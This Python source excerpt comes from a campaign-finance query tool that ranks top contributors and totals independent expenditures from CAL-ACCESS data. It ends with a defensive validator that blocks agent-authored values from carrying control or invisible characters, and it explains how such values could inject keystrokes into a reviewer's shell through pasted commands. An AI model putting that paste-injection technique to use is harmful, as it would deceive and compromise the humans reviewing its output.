def _top_contributor(root: Path, *, filer_id: str, form_type: str | None = None,
                     names: str = "") -> QueryResult:
    """The single largest contributor to a filer, by itemized total.

    Grouped by last AND first name: CTRIB_NAML is the surname for individuals, so grouping on
    it alone merged every unrelated donor sharing one, reporting a top contributor who does not
    exist.

    `form_type` defaults to A (monetary contributions received), as `filer_total` does. Ranked
    over every receipt schedule, a vendor's refund or a bank's interest (I) could name a
    business that gave nothing "the largest contributor", and an in-kind item (C) could decide
    between two donors. Pass another schedule to rank by that one, or "" for every schedule.

    A tie is every contributor within half a cent (TOLERANCE) of the top, listed whole however
    many there are, by name as displayed (first name first) and ignoring case. A large tie is
    not refused: the whole set is a true answer that reproduces, and the detail says it is no
    single largest contributor. A cap would be an arbitrary number turning that answer into a
    miss. The cost is a value as long as the tie, which a citation records whole. Two tied
    names that show alike are listed as filed (`_filed`), since one giver filed two ways shows
    as "Rue Quillon | Rue Quillon", which reads as one donor.

    Each name is ranked exactly as filed, and names are never added together. Filers don't
    reliably split or spell out names, so one giver can be ranked under two, each short of what
    they gave. So the answer stands only when (`_could_change_ranking`):
    1. the leader's own total is at least every other group's upper bound (`_groups`), and
    2. no other name is in the leader's group.
    Otherwise it is a miss naming each group that could change the answer and its bound,
    unless names=as_filed, which ranks each name apart and says whether that could.

    Left unset, `form_type` holds pending late gifts no schedule A restates yet
    (`_pending_late`) against the ranking the same way: a miss when adding them to what their
    group could hold could reach the top or break a tie. A late gift that cannot is named in
    the detail, and the ranking stands. form_type=A ranks schedule A alone, and does not verify
    while a late gift could change it (`QueryResult.unsettled`); names=as_filed does not while
    names that could be one giver's could.
    """
    from . import calaccess

    gated, form_type = _gate(form_type)
    names_gated = _names_gate(names)
    _schedule(form_type)   # refuses a padded form_type before anything is opened
    con = calaccess.connect_citable(root)
    try:
        return _ranking(con, filer_id, form_type, gated, names_gated)
    finally:
        con.close()


def _ranking(con: Any, filer_id: str, form_type: str, gated: bool,
             names_gated: bool) -> QueryResult:
    """`_top_contributor`, on an open connection."""
    late = _late_reports(con, filer_id, form_type)
    schedule, schedule_args, label = _schedule(form_type)
    # Every contributor's total, not the first few: a tie is everyone at the top. Fetched with
    # LIMIT 4, five givers at the contribution limit came back as a four-way tie naming
    # whichever four SQLite picked, and that value reproduced. The names order equal totals, so
    # the tie and the checks below read them in one order.
    groups = _givers(con, filer_id, form_type)
    # Only gifts with an amount are ranked: read as 0.0, a contributor whose gifts all had blank
    # amounts tied one whose stated total was $0. A contributor with no readable gift sums to
    # NULL, which sorts last and is never ranked.
    unread = sum(int(g["unread"] or 0) for g in groups)
    groups = [g for g in groups if g["amt"] is not None]
    row = groups[0] if groups else None
    if row is None:
        note, hint = _elsewhere(con, filer_id, form_type)
        # With a schedule to rank, every gift on it can be on one a later amendment left out.
        # Not asked while a gift has no amount: that is a miss whatever the left-out rows hold.
        omitted = [] if unread else _left_out_receipts(con, str(filer_id), schedule,
                                                       schedule_args)
        late_note = _late_note(late)
        miss = _no_rows(f"no {label} contributions {'counted' if unread else 'found'} for "
                        f"filer {filer_id}{_unread(unread)}{note}"
                        + (f"; {late_note}" if late_note else ""), hint)
        miss.omitted = omitted
        return miss
    top = float(row["amt"] or 0)
    tied = [r for r in groups if abs(float(r["amt"] or 0) - top) < TOLERANCE]
    shown = [_shown(r["nf"], r["nm"]) for r in tied]
    if not all(shown):
        # Its value would be "" (or a tie with an empty part), and "" matches "": a green
        # citation naming nobody as the largest contributor. Whatever the gates: no name as
        # filed can be the answer, and there is nobody to hold it for.
        return _no_rows(f"{len(tied)} giver(s) at the top of {label} gifts at ${top:,.0f}, and "
                        f"{len(shown) - len(list(filter(None, shown)))} filed with no name at "
                        "all — no name to give as the largest contributor; open the filings")
    alike = Counter(_name_key(n) for n in shown)
    shown = [n if alike[_name_key(n)] == 1 else f"{n} (filed {_filed(r['nm'], r['nf'])})"
             for n, r in zip(shown, tied)]
    # Sorted as displayed, ignoring case and Unicode form (`_name_key`), then as spelled. A later
    # export can add a row that spells a name in another case, and a case-sensitive sort then
    # moved "Rue ABBOT" from after "Rue Aaron" to before it: `matches()` ignores case but not
    # order.
    listed = " | ".join(sorted(shown, key=lambda n: (_name_key(n), n)))
    if unread:
        # A total can say "the stated gifts come to X" and name what it left out. A rank
        # cannot: a gift of unknown size could make anyone largest, so while one exists no
        # contributor is established as the largest. The stated leader is named as a lead to
        # check by hand, not a finding.
        lead = shown[0] if len(tied) == 1 else f"a {len(tied)}-way tie ({listed})"
        return _no_rows(f"{lead} leads the stated amounts at ${top:,.0f} in {label} gifts, but "
                        f"no largest contributor can be named{_unread(unread, ' to this filer')}")
    # Past the check above, every contributor has a readable total: none sums to NULL.

    # Each check runs once: with no late entry, the late and the names-only checks are one.
    # So does each grouping: the late check and the one with both group the same names.
    checks: dict[tuple[bool, bool], list[_Contender]] = {}
    grouped: dict[bool, dict[Any, int]] = {}

    def check(use_late: bool, use_names: bool) -> list[_Contender]:
        key = (use_late and bool(late), use_names)
        if key not in checks:
            if key[0] not in grouped and (key[0] or key[1]):
                names = {("name", g["kl"], g["kf"]): _name(g["kl"], g["kf"]) for g in groups}
                if key[0]:
                    names.update({("late", i): _name(e["naml"], e["namf"])
                                  for i, e in enumerate(late)})
                grouped[key[0]] = _groups(names)
            checks[key] = _could_change_ranking(groups, tied, top, late if key[0] else [],
                                                use_names=key[1], grouped=grouped.get(key[0]))
        return checks[key]

    def blamed(use_late: bool, use_names: bool) -> tuple[bool, bool]:
        # A cause is blamed when it could change the ranking alone, so a detail never blames a
        # late gift too small to matter, or names that aren't on the ranking. When only the two
        # together could, both are.
        by_late = use_late and bool(check(True, False))
        by_name = use_names and bool(check(False, True))
        if not (by_late or by_name) and (use_late or use_names) and check(use_late, use_names):
            return use_late and bool(late), use_names
        return by_late, by_name

    said: dict[int, list[str]] = {}

    def lines(could: list[_Contender]) -> list[str]:
        # Once per list: `_identity` is a query of its own.
        if id(could) not in said:
            where = _identity(con, filer_id, form_type, [
                (g["kl"], g["kf"]) for c in could[:LATE_SHOWN] if c.kind == "group"
                for g in c.ranked[:3]])
            said[id(could)] = [_contender_line(c, label, where) for c in could]
        return said[id(could)]

    def listing(could: list[_Contender]) -> str:
        return ("; ".join(lines(could)[:3])
                + (f"; and {len(could) - 3} more" if len(could) > 3 else ""))

    if check(gated, names_gated):
        by_late, by_name = blamed(gated, names_gated)
        causes = ([_late_note(late)] if by_late else []) + ([SPLIT] if by_name else [])
        fixes = ((["form_type=A ranks schedule A alone, for a person to check against these "
                   "late reports"] if by_late else [])
                 + (["names=as_filed ranks each name as filed, for a person to check whether "
                     "they are one giver"] if by_name else []))
        # The contenders of the cause blamed: each lifts only its own.
        could = check(by_late, by_name)
        return _no_rows(f"{listed} lead{'s' if len(tied) == 1 else ''} "
                        f"{'schedule ' + form_type if form_type else 'every schedule'} at "
                        f"${top:,.0f}, but {' and '.join(causes)} could change the ranking: "
                        f"{listing(could)} — not a settled ranking; {'; and '.join(fixes)}",
                        [f.split(" ")[0] for f in fixes])
    # It stands on the gates in force. What a lifted gate's cause could do, beside what the gate
    # still in force weighs, goes in the detail and holds the value for a person
    # (`QueryResult.unsettled`): a note alone renders green. Asked alone, a late gift that moves
    # the ranking only together with names that could be one giver's was not held.
    moved = check(True, names_gated) if late and not gated else []
    split = check(gated, True) if not names_gated else []
    if not (gated or names_gated or moved or split) and check(True, True):
        moved = split = check(True, True)   # only the two together could: hold both
    # Every gift, not only the top contributor's: the ranking is made of all of them, and a
    # gift a later amendment dropped can put someone at the top, or keep someone off it. So can
    # a gift the ranking leaves out, on a schedule a later amendment did not restate. Neither is
    # asked while a gift has no amount, or a late gift or a name holds the ranking (above).
    inner = DEDUPED_RECEIPTS.format(extra=schedule)
    args: list[Any] = [str(filer_id)] + schedule_args
    ids = con.execute(f"""
        SELECT GROUP_CONCAT(DISTINCT d.FILING_IDS) ids FROM ({inner}) d
        WHERE d.AMT IS NOT NULL
    """, args).fetchone()["ids"]
    unrestated = _receipt_shares(con, inner, args, ids)
    omitted = _left_out_receipts(con, str(filer_id), schedule, schedule_args)
    note = _late_note(late, ", not counted — they " + (
        "could change the ranking" if moved else "cannot change the ranking"))
    note = f"; {note}" if note else ""
    if split:
        note += f"; {SPLIT}, not counted as one, could change the ranking: {listing(split)}"
    # Held for a person only when one could change it, naming the late reports that could: a
    # ranking no late gift can move stands, and a report that cannot move it is not the one to
    # open. If no contender holds a late entry of its own, every late report is held, since
    # holding none would let it verify.
    moving = list({id(e): e for c in moved for e in c.late}.values())
    # A late entry can move it by linking names on the schedule into one group: the person
    # checking has to see those names, not only a late report too small to matter alone.
    linked = [c for c in moved if c.kind == "group" and not any(c is d for d in split)]
    held = {"late": _by_report(moving or late) if moved else [],
            "names": lines(split) + (lines(linked) if linked else [])}
    if len(tied) > 1:
        # ORDER BY ... LIMIT 1 makes an arbitrary pick among equals, and a verifier rightly
        # rejected a "largest contributor" that was really a two-way tie. Return the tie.
        return QueryResult(value=listed, rows=len(tied), unrestated=unrestated, omitted=omitted,
                           **held,
                           detail=f"{len(tied)}-WAY TIE at ${top:,.0f} in {label} gifts — not "
                                  "a single largest contributor; do not word this as one"
                                  + note)
    return QueryResult(value=shown[0], rows=int(row["n"] or 0), unrestated=unrestated,
                       omitted=omitted, **held,
                       detail=f"${top:,.0f} across {row['n']} {label} gift(s){note}")


class _Contender(NamedTuple):
    """Someone who could be at the top instead, or a leader who could move."""
    reach: float                    # the most they could reach
    kind: str                       # "name", "late" (a late giver of their own) or "group"
    ranked: tuple[Any, ...]         # the names on the ranking, rows of `_givers`
    late: tuple[dict[str, Any], ...]   # the late entries that could be theirs
    shown: str                      # the name a tie would show, for order


_INF = float("inf")


def _late_range(entries: Any) -> tuple[float, float]:
    """(the most, the least) late entries could add to a giver's total: every positive amount,
    or every negative one, as if no entry were a copy of another. An amount nobody stated could
    be anything."""
    up = down = 0.0
    for e in entries:
        a = e["amt"]
        up = _INF if a is None else up + max(a, 0.0)
        down = -_INF if a is None else down + min(a, 0.0)
    return up, down


def _could_change_ranking(groups: list[Any], tied: list[Any], top: float,
                          late: list[dict[str, Any]], *, use_names: bool,
                          grouped: dict[Any, int] | None = None) -> list[_Contender]:
    """Who could be at the top instead of the leaders, or a leader who could move: highest
    reach first. Empty if the ranking stands.

    Names are grouped by `_groups`, over the names on the ranking and the pending late entries
    in `late`. A group is never a figure, only a bound on one. What each could reach:
    - `use_names`: a group. Its bound is every positive gift in it, since any of its names
      could be one giver's and a name's gifts could be split between two givers, plus every
      positive late amount in it. A gift nobody stated an amount for makes it unbounded: a blank
      is not zero. (`_ranking` names no largest contributor while one exists, so this is the
      check's own guard, not one it relies on its caller for.) A group holding one name ranks as that name, its own total plus its group's
      late amounts, and its late entries under another name could be a giver of their own. A
      leader's group has to hold no other name on the ranking; if it does, it is a contender
      whatever its bound, since another giver in it could pass the leader.
    - otherwise each name as filed, its own total plus every late amount in its group, and the
      late entries filed under none of its names, as a giver of their own.
    Each late entry counts once per giver, never once per name it could be, so a chain of names
    cannot sum it twice.

    The answer stands if nobody outside the leaders could come within a cent of the lowest a
    leader could fall to, and no leader of a tie could move. Everything uncertain only widens a
    range, which only makes the answer refuse more often. `grouped` is `_groups` of the same
    names, when the caller has it already.
    """
    if not (use_names or late):
        return []   # every name as filed, and nothing to add to any: the ranking is the answer
    ranked = {("name", g["kl"], g["kf"]): g for g in groups}
    words = {k: _name(g["kl"], g["kf"]) for k, g in ranked.items()}
    words.update({("late", i): _name(e["naml"], e["namf"]) for i, e in enumerate(late)})
    of = grouped if grouped is not None else _groups(words)
    members: dict[int, list[Any]] = {}
    for k in words:
        members.setdefault(of[k], []).append(k)
    # A name with no words could be in any group, so it is counted in each.
    anyone = members.pop(_ANYONE, [])
    members = {gid: ks + anyone for gid, ks in members.items()}
    leaders = dict.fromkeys(("name", r["kl"], r["kf"]) for r in tied)
    lo: dict[Any, float] = {}
    hi: dict[Any, float] = {}
    owed_by: dict[int, tuple[dict[str, Any], ...]] = {}
    units: list[_Contender] = []
    forced: list[_Contender] = []
    stuck: set[Any] = set()     # leaders in a group with another name
    home = {k: gid for gid, ks in members.items() for k in ks if words[k].words}
    for gid, ks in members.items():
        names = [k for k in ks if k[0] == "name"]
        owed = owed_by[gid] = tuple(late[k[1]] for k in ks if k[0] == "late")
        up, down = _late_range(owed)
        for k in names:
            total = float(ranked[k]["amt"] or 0)
            lo[k], hi[k] = total + down, total + up
        if use_names and len(names) > 1:
            rows = tuple(ranked[k] for k in names)
            bound = (_INF if any(g["unread"] for g in rows)
                     else sum(float(g["pos"] or 0) for g in rows)) + up
            unit = _Contender(bound, "group", rows, owed, _shown(rows[0]["nf"], rows[0]["nm"]))
            if lead := [k for k in names if k in leaders]:
                forced.append(unit)
                stuck.update(lead)
            else:
                units.append(unit)
            continue
        units += [_Contender(hi[k], "name", (ranked[k],), owed,
                             _shown(ranked[k]["nf"], ranked[k]["nm"]))
                  for k in names if k not in leaders]
        filed = {words[k].words for k in names}
        strangers = tuple(late[k[1]] for k in ks
                          if k[0] == "late" and words[k].words not in filed)
        if strangers:
            units.append(_Contender(_late_range(strangers)[0], "late", (), strangers,
                                    _late_names(strangers)))
    # A name with no words is in every group, so it made a unit in each: keep its highest.
    best: dict[Any, _Contender] = {}
    for u in units:
        key = (u.kind, tuple((g["kl"], g["kf"]) for g in u.ranked),
               tuple(id(e) for e in u.late) if u.kind == "late" else ())
        if key not in best or u.reach > best[key].reach:
            best[key] = u
    units = list(best.values())
    floor = min(lo[k] for k in leaders)
    could = forced + [u for u in units if u.reach > floor - TOLERANCE]
    free = [k for k in leaders if k not in stuck]

    def leader(k: Any) -> _Contender:
        g = ranked[k]
        return _Contender(hi[k], "name", (g,), owed_by[home[k]], _shown(g["nf"], g["nm"]))

    if len(leaders) > 1:
        could += [leader(k) for k in free if lo[k] <= top - TOLERANCE or hi[k] >= top + TOLERANCE]
    elif could:
        could += [leader(k) for k in free if lo[k] <= top - TOLERANCE]
    # Highest reach first, then by name as a tie is listed, so a refusal names the same three
    # on every run: in load order, two late givers filed the same day could swap. Reach to the
    # cent: summed as floats, $6,000.01 and $0.02 reach 6000.030000000001, which put that giver
    # ahead of one at $6,000.03 whose name comes first.
    return sorted(could, key=lambda c: (-round(c.reach, 2), _name_key(c.shown), c.shown,
                                        c.kind, [(g["kl"], g["kf"]) for g in c.ranked]))


def _late_names(entries: Any) -> str:
    """How a refusal names a late giver: every name its entries are filed under, each once and
    in its least spelling, ordered by name ("Ada B Quennell, Ada C Quennell or Ada Quennell").
    Not the first entry's name: which entry comes first is not the giver's name, and the order
    of entries within a day and a filing was once the order rows were loaded in."""
    spelled: dict[tuple[str, str], str] = {}
    for e in entries:
        key = (_name_key(e["naml"]), _name_key(e["namf"]))
        name = _shown(e["namf"], e["naml"])
        spelled[key] = min(spelled.get(key, name), name)
    names = [spelled[k] for k in sorted(spelled)]
    return names[0] if len(names) == 1 else f"{', '.join(names[:-1])} or {names[-1]}"


def _late_part(entries: Any) -> str:
    """How a contender's late entries read. Display only."""
    amounts = [e["amt"] for e in entries]
    return ("no late gift" if not amounts else "a late amount nobody stated"
            if None in amounts else f"${sum(a or 0.0 for a in amounts):,.0f} late")


def _contender_line(c: _Contender, label: str, where: dict[tuple[str, str], str]) -> str:
    """How a refusal names one contender: a name as the ranking shows it, with its total and
    its group's late gifts; or a group, each name as filed and where its gifts came from, with
    the group's bound. Display only."""
    if c.kind != "group":
        scheduled = float(c.ranked[0]["amt"] or 0) if c.ranked else 0.0
        return (f"{c.shown or 'an unnamed giver'} (${scheduled:,.0f} on {label}, "
                f"{_late_part(c.late)})")
    lines = [_name_line(g, where.get((g["kl"], g["kf"]), "")) for g in c.ranked[:3]]
    more = f" + {len(c.ranked) - 3} more names" if len(c.ranked) > 3 else ""
    bound = (f"${c.reach:,.0f}" if c.reach != _INF
             else "any amount, since a gift in it has no readable amount")
    return (f"{' + '.join(lines)}{more}, which could be one giver's: up to {bound} on {label}"
            + (f", with {_late_part(c.late)}" if c.late else ""))


def _ie_total(root: Path, *, candidate_last: str, first: str = "", stance: str = "",
              since: str = "", until: str = "") -> QueryResult:
    """Total late independent expenditures naming a candidate.

    `since`/`until` are ISO dates (YYYY, YYYY-MM or YYYY-MM-DD) bounding the expenditure
    date, inclusive at their own precision: until="2025" runs through 12/31/2025. Without them
    2006 and 2026 are summed together, which cannot answer a question about either race: a
    candidate's unfiltered support figure can be dominated by a campaign for another office
    years earlier.
    """
    from . import calaccess

    # Refused, not used: "10/14/2025" compared against normalized dates filters by string
    # order, and a total from the wrong window still matches its own recorded `expected`.
    window, window_args = date_window_sql("d", since, until)
    if not first.strip():
        # Asked for a surname alone this returned 22x the real figure: most of it belonged to a
        # different candidate with the same surname, in another county and year. A surname
        # is not a candidate, and there is no page or snippet downstream to catch it.
        raise ValueError(
            "ie_total needs `first`: a surname alone mixes candidates (in testing it returned "
            "22x the real figure, mostly a different person). Pass the first name.")

    # Refuses a database whose covers carry no amendment ids: this total could include money a
    # later amendment gave to another candidate.
    con = calaccess.connect_citable(root)

    def asked(cover: str) -> str:
        """What this total asks for, as a condition on cover alias `cover`, taking `args`."""
        return (name_match_sql(f"{cover}.CAND_NAML", f"{cover}.CAND_NAMF", first)
                + (f" AND UPPER({cover}.SUP_OPP_CD) = UPPER(?)" if stance else ""))

    match = asked("c")
    args: list[Any] = name_args(candidate_last, first) + ([stance[:1]] if stance else [])
    # EXP_DATE is "M/D/YYYY 12:00:00 AM" text, so a string comparison would sort 5/24/2026
    # before 10/14/2014: window the normalized date instead. A row whose date did not
    # normalize cannot be placed inside a window, so it stays out of one, as it always has --
    # but it is counted, and the detail says so, rather than dropped without a word. The real
    # export has 31 such rows, all with a blank amount.
    dated = real_date_sql("d") if window else "1"   # with no window, d is never computed
    inside = f"({dated} AND {window})" if window else "1"
    # A blank AMOUNT is money nobody stated, not $0 (`amount_sql()`): NULL here, left out of the
    # sum AND the count, and named in the detail. The real export has 33 blanks and nothing
    # else unreadable.
    amount = amount_sql("s.AMOUNT")
    matched = f"""
        SELECT fid, amt, {dated} AS dated, {inside} AS inside
        FROM (SELECT s.FILING_ID fid, {amount} amt, {iso_date_sql("s.EXP_DATE")} d
              FROM S496_LATEST s JOIN CVR_LATEST c ON c.FILING_ID = s.FILING_ID
              WHERE {match})
    """
    row = con.execute(f"""
        SELECT SUM(CASE WHEN inside THEN amt END) amt, SUM(inside AND amt IS NOT NULL) n,
               SUM(inside AND amt IS NULL) unread_n,
               SUM(NOT dated) undated_n, SUM(CASE WHEN NOT dated THEN amt END) undated_amt
        FROM ({matched})
    """, window_args + args).fetchone()
    n = int(row["n"] or 0)
    span = f"{since or '...'}..{until or '...'}"
    left_out = ""
    if row["unread_n"]:
        left_out += f"; {row['unread_n']} more with no readable amount, not counted"
    if window and row["undated_n"]:
        # an unreadable AMOUNT has no money to report; say nothing rather than "$0.00"
        undated_amt = float(row["undated_amt"] or 0)
        left_out += (f"; {row['undated_n']} more with no readable date, not counted"
                     + (f" (${undated_amt:,.2f} between them)" if undated_amt else ""))
    # The other side of the latest-cover rule: rows the window and amount rules would count,
    # whose own amendment's cover matches what this total asks for while no cover of the
    # filing's latest amendment does. This total never counts them and no other flag sees
    # them, so a total short by them read as settled. Which cover is right is not decided here
    # (CLAUDE.md, "Whose money a kept row is"): the row is named, for a person to open.
    # MATERIALIZED, so the correlated tests run first and the date work only on the few rows
    # they keep. Flattened, SQLite worked out every expenditure's window first: 3s where this
    # takes 0.6s, on a synthetic export of 1.5 million covers.
    reattributed = [
        calaccess.Reattributed(str(r["fid"]), r["own_a"],
                               *calaccess.latest_cover(con, r["fid"]),
                               float(r["amt"]), int(r["n"]))
        for r in con.execute(f"""
            WITH left_out AS MATERIALIZED (
                SELECT s.FILING_ID fid, CAST(s.AMEND_ID AS INTEGER) own_a, {amount} amt,
                       {iso_date_sql("s.EXP_DATE")} d
                FROM S496_LATEST s WHERE {calaccess.left_out_sql(asked)})
            SELECT fid, own_a, SUM(amt) amt, COUNT(*) n
            FROM (SELECT fid, own_a, amt, {inside} AS inside FROM left_out)
            WHERE inside AND amt IS NOT NULL
            GROUP BY fid ORDER BY amt DESC, fid
        """, args * 2 + window_args).fetchall()]
    if n == 0:
        if reattributed:
            # Carried on the miss below, as the receipt queries carry a left-out schedule: a
            # miss with an unsettled reason goes to a person (`vg verify`), and that reason
            # names each filing, so the detail only says why nothing was counted. Without it
            # the miss read as "nobody spent on this candidate" when a filing's own amendment
            # says someone did.
            left_out += (f"; {sum(u.rows for u in reattributed)} more whose filing's latest "
                         f"cover names another candidate, the other stance or none, not counted "
                         f"(${sum(u.amount for u in reattributed):,.2f} between them)")
        # The failure this guard exists for: a committee filed the candidate's whole name in
        # the last-name field, so a (last, first) filter found nothing and SUM() returned 0.0:
        # a confident "nobody spent against them", wrong by the largest expenditure in the race.
        near = [f"{r['nl']!r}/{r['nf']!r} {r['so']} "
                + (f"${float(r['amt']):,.0f}" if r["amt"] is not None else "no readable amount")
                for r in con.execute(f"""
            SELECT c.CAND_NAML nl, c.CAND_NAMF nf, c.SUP_OPP_CD so, SUM({amount}) amt
            FROM S496_LATEST s JOIN CVR_LATEST c ON c.FILING_ID = s.FILING_ID
            WHERE UPPER(c.CAND_NAML) LIKE UPPER(?) OR UPPER(c.CAND_NAMF) LIKE UPPER(?)
            GROUP BY UPPER(TRIM(c.CAND_NAML)), UPPER(TRIM(c.CAND_NAMF)), c.SUP_OPP_CD
            ORDER BY amt DESC LIMIT 6
        """, (f"%{candidate_last.strip()}%", f"%{candidate_last.strip()}%"))]
        con.close()
        # "counted": with rows left out, there were expenditures -- just none this can sum
        miss = _no_rows(f"no {stance or 'any'}-stance expenditures"
                        + (" counted" if left_out else "")
                        + (f" in {span}" if window else "") + left_out, near)
        miss.reattributed = reattributed
        return miss
    # Only the rows the total counts: one left out of the window, or with no readable amount,
    # has no share in it.
    unrestated = calaccess.unrestated_shares(con, "S496_CD", [
        ([r["fid"]], float(r["amt"]), int(r["n"])) for r in con.execute(f"""
            SELECT fid, SUM(amt) amt, COUNT(*) n FROM ({matched})
            WHERE inside AND amt IS NOT NULL GROUP BY fid
        """, window_args + args)])
    con.close()
    return QueryResult(value=float(row["amt"] or 0), rows=n, unrestated=unrestated,
                       reattributed=reattributed, detail=f"{n} expenditure(s)"
                              + (f", {span}{left_out}" if window else
                                 f"{left_out} — NO DATE FILTER, may span multiple races"))


class Query(NamedTuple):
    fn: Callable[..., QueryResult]
    required: tuple[str, ...]
    description: str
    # Which definition this is. A verdict on a query citation was formed about one calculation,
    # and the sid (name + params + expected) does not cover the calculation — so a definition
    # that changed but happened to return the same number would keep a verdict about the old
    # one. Every name here has already returned different numbers after a fix (amendment,
    # cover-record and cross-form dedup; the first-name requirement). A verdict recorded under
    # another version is stale (`judgments.is_stale()`), and `vg verify` says which.
    #
    # BUMP IT when a change can alter what the query returns for ANY input the previous
    # version accepted, even if every recorded figure still reproduces: dedup, name matching,
    # what a parameter or a date bound means, a newly required parameter, refusing an input
    # that used to return a value. The recorded figures reproducing is not the test — the
    # verifier judged the calculation, not only its output.
    # DON'T bump for what cannot change a value: wording of `detail` or an error, near-match
    # suggestions, speed, a new optional parameter whose default keeps the old behaviour.
    # When unsure, bump: the cost is re-judging this query's verdicts once; the cost of not
    # bumping is a verdict vouching for a calculation nobody checked.
    #
    # A comment is not a gate. `test_a_query_definition_cannot_change_unnoticed` pins each
    # query's (version, fingerprint of its code and of every shared helper and dedup view it
    # runs through) and fails on any change, so the decision above is made on purpose, in the
    # diff a reviewer reads, rather than skipped.
    version: int


REGISTRY: dict[str, Query] = {
    # v2 of the three receipt queries: an AMOUNT that is not a number is left out of the sum and
    # the count and named (`amount_sql()`), where v1 read it as $0.00 -- or, for "1,000", $1.
    # v3 of contributor_total and top_contributor: schedule A only by default, as filer_total
    # already was. v2 summed every receipt schedule, refunds and interest included.
    # v4 of those two and v3 of filer_total: each refuses a database whose covers carry no
    # amendment ids (connect_citable), which the earlier versions answered from. ie_total
    # already refused one, so its value and its refusals are unchanged, and it stays at v2. The
    # unrestated flag every query now carries changes no value: verification acts on it.
    # v4 of filer_total: a padded form_type is refused (`_schedule`). v3 ran " " as a filter for
    # the receipts with no schedule and returned their sum.
    # v5 of the three: with form_type unset, a miss while a late-reported gift that no schedule
    # A restates yet could change the answer (`_pending_late`).
    # v6 of the three: with form_type A or "" named, a database that cannot read Form 497
    # refuses where v5 answered. The value is otherwise unchanged; a pending late gift now holds
    # it for a person (`QueryResult.late`), which verification acts on.
    # v7 of top_contributor: a tie is every contributor at the top, sorted ignoring case, and
    # each name is spelled the same whatever order its rows were loaded in (MIN, trimmed). v6
    # built the tie from the first four rows, so a tie of five or more named four of them, and
    # it sorted with case and spelled a name from whichever row SQLite read.
    # No bump for the flag for a schedule a later amendment left out (`omitted`), or the
    # grouping it shares with these queries: it changes no value, and DEDUPED_RECEIPTS is the
    # same SQL. Nor for ie_total's `reattributed`, for rows it leaves out: verification acts on
    # it.
    # v7 of contributor_total and v8 of top_contributor: names are grouped by the transitive
    # closure of `_could_be` (`_groups`), which reads an initial as short for a word either way
    # round, after accents are folded. A figure is a miss while its name's group holds another
    # name on the schedule, and a ranking while the leader's does or another group's upper
    # bound reaches the top (names=as_filed lifts that gate alone). Late entries are held
    # against a figure by the same groups, not pairwise, and a Form 496 Part 3 row under another
    # name is held as that name. Two tied names that show alike are listed as filed. A value
    # names=as_filed gives is held for a person while another name could change it
    # (`QueryResult.names`). v6 and v7 ranked each name apart, green, and matched late entries by
    # whole words.
    # v7 of filer_total, with those: the cross-form dedup and the late-report restatement key
    # names as the queries do, in Python, normalized and case-folded (`_name_key`). v6 used
    # SQLite's ASCII-only UPPER and TRIM, so a gift's two copies filed 'Élise' and 'élise' were
    # both counted, and a late gift restated as 'JOSÉ' was still pending as 'José'.
    "calaccess.contributor_total": Query(
        _contributor_total, ("filer_id", "contributor"),
        "contributions from one contributor (add contributor_first for an individual; "
        "schedule A unless form_type says otherwise; a miss while a late gift is pending, or "
        "while another name could be the giver's, unless names=as_filed)", 7),
    "calaccess.filer_total": Query(
        _filer_total, ("filer_id",),
        "total itemized contributions received by a filer (schedule A unless form_type says "
        "otherwise; a miss while a late gift is pending)", 7),
    "calaccess.top_contributor": Query(
        _top_contributor, ("filer_id",),
        "the largest contributor to a filer, by itemized total (schedule A unless form_type "
        "says otherwise; a miss while a pending late gift, or names that could be one giver's, "
        "could change it, unless names=as_filed)", 8),
    "calaccess.ie_total": Query(
        _ie_total, ("candidate_last", "first"),
        "late independent expenditures naming a candidate; pass stance and since/until", 2),
}


def dataset(name: str) -> str:
    """The dataset a query named `name` reads, by the namespace of its name ("" for none)."""
    return {"calaccess": "CAL-ACCESS"}.get(name.split(".", 1)[0], "")


def describe_export(export_date: str, data: str = "CAL-ACCESS") -> str:
    """How every message names the export a figure came from — `vg query`, `vg judge`,
    `vg judgments` and the review page — so a reviewer comparing them reads one phrasing."""
    if export_date:
        return f"the {data} export of {export_date}"
    return (f"an undated {data} database (built before exports were dated; rebuild it with "
            f"`vg calaccess build`)")


def export_date(name: str, root: Path) -> str:
    """The date of the export a query named `name` reads under `root`, or "" if unknown."""
    if dataset(name) != "CAL-ACCESS":
        return ""
    from . import calaccess

    return calaccess.export_info(root).get("export_date", "")


# Unicode's whole Default_Ignorable_Code_Point set (DerivedCoreProperties.txt), not a sample:
# code points that render as nothing. str.isprintable() already rejects the Cf/Cn ones (bidi
# overrides, zero-width), but the letters and marks among them pass it — U+3164 HANGUL
# FILLER, U+034F COMBINING GRAPHEME JOINER, the variation selectors. Plus U+2800 BRAILLE
# PATTERN BLANK, which is not "ignorable" but renders as nothing all the same.
_INVISIBLE = re.compile(
    r"[­͏؜ᅟᅠ឴឵᠋-᠏​-‏‪-‮"
    r"⁠-⁯⠀ㅤ︀-️﻿ﾠ￰-￸"
    r"\U0001bca0-\U0001bca3\U0001d173-\U0001d17a\U000e0000-\U000e0fff]")
_QUERY_NAME = re.compile(r"[A-Za-z0-9_]+(?:\.[A-Za-z0-9_]+)*")
_PARAM_KEY = re.compile(r"[A-Za-z_][A-Za-z0-9_]*")


def unprintable(text: str) -> bool:
    """Whether `text` holds a character a pasted command cannot carry as displayed: a control
    character, or one that renders as nothing (`_INVISIBLE`, or anything str.isprintable()
    rejects). The one rule for every value printed into `human_command()`."""
    return not text.isprintable() or bool(_INVISIBLE.search(text))


def unsafe_reason(name: str, params: dict[str, str]) -> str | None:
    """Why this query cannot be printed as a command a reviewer can safely paste, or None.

    The name, keys and values are agent-authored, and `human_command` hands them to a human's
    shell. Quoting makes any printable text inert; it cannot help with the rest:
    - a control character acts on the terminal before the shell parses a quote (^C abandons
      the line; an embedded end-of-bracketed-paste turns what follows into keystrokes);
    - a name starting with `-` is read by `vg query` as an option, quoted or not;
    - a key holding `=` is split differently by `vg query` than it was by verification;
    - an invisible character (`_INVISIBLE`, or anything str.isprintable() rejects) makes the
      command on screen differ from the one copied.
    The messages never echo the text. The cost, measured: 84 of ~1.2M distinct contributor
    names in the CAL-ACCESS export carry control bytes (stray \\x02/\\x0b/\\x12, and C1 bytes
    from double-encoded accents), and those contributors cannot be cited by query. Cite the
    filing page instead. No candidate name or filer id in the export is affected.
    """
    if not _QUERY_NAME.fullmatch(str(name)):
        return "query name must be a dotted registry name (letters, digits, _ and .)"
    for k, v in params.items():
        if not _PARAM_KEY.fullmatch(str(k)):
            return "query parameter names must be identifiers (letters, digits and _)"
        if unprintable(str(v)):
            return f"query parameter {k} contains a control or invisible character"
    return None


def run(name: str, params: dict[str, str], root: Path) -> QueryResult:
    # Unknown names first, so a typo gets the list of real ones rather than a charset rule.
